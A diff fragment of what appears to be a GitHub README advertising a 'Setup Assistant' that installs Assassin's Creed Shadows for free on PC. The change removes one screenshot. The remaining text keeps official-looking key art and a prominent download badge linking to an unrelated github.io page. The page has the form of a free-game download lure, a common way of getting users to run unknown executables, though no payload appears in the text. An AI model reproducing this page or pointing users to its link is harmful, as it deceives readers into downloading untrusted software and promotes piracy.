@@ -17,9 +17,6 @@ This assistant allows you to **install Assassin's Creed Shadows for free on PC**
 ![Key Art — Naoe & Yasuke](https://staticctf.ubisoft.com/J3yJr34U2pZ2Ieem48Dwy9uqj5PNUQTn/1RLdppgLllgGZlkjuvHBu6/abbcf1e12935e4654a109324955a5087/RED_KEYART_STD_RGB_WW.jpg)  
 *Shinobi meets samurai in the most visually rich Assassin’s Creed yet*
 
-![Open World Japan](https://cdn2.unrealengine.com/assassins-creed-shadows-4-3840x2160-f39834a5370e.jpg)  
-*Explore dynamic weather, seasonal changes, and immersive feudal landscapes*
-
 ---
 
 [![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://assassins-creed-shadows-pc-download.github.io/.github)
